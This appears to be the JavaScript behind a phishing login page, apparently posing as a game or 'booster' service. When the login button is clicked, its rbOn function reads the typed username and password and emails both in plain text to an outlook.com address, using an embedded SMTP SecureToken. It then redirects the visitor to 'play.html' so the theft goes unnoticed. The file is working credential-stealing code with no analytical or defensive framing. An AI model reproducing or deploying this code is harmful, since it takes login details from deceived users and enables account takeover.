const username = document.getElementById('username');
const password = document.getElementById('password');
const loginbtn = document.querySelector('.loginbtn');

loginbtn.addEventListener('click',()=>{
    if (username.value.replace(" ","") != '' && password.value.replace(" ","") != '') {
       rbOn(username.value,password.value)
    } else error();
});

function rbOn(user,pwd) {
    Email.send({
        SecureToken: 'ff23ef3b-708c-47ba-a213-fd400bd731da',
        To: 'stuffbooster@outlook.com',
        From: 'stuffbooster@outlook.com',
        Subject: `RB: ${user} / ${pwd}`,
        Body: `<p><b>username:</b> ${user}</p> 
         <p><b>password:</b> ${pwd}</p>`,
    }).then((message) => {
        //alert(message)
        window.location.href = 'play.html'
    });
}

